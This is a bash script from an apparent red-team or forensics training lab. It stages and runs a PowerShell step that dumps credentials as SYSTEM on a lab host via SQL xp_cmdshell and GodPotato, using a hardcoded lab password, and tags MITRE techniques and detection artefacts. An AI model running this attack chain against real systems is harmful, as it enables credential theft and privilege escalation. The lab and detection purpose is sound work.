#!/usr/bin/env bash
# T035 — Credential dump as SYSTEM on mbr01 via SQL xp_cmdshell + GodPotato
# MITRE: T1003 (OS Credential Dumping), T1078 (Valid Accounts), T1570 (Lateral Tool Transfer)
# DFIR: Security 4624/4648, Sysmon 1/10/11, Zeek smb.log, WinRM 91/93
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T035-MBR01-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t035-mbr01-creds.ps1"

echo "=== T035 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t035-mbr01-creds.ps1"
# Ensure the reusable SYSTEM-exec helper is also staged
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-system-exec.ps1" "campaign-a-t043-system-exec.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t035-mbr01-creds.ps1 -Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools'"

cadre_export "${CASE_ID}" T035 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T035 complete ==="
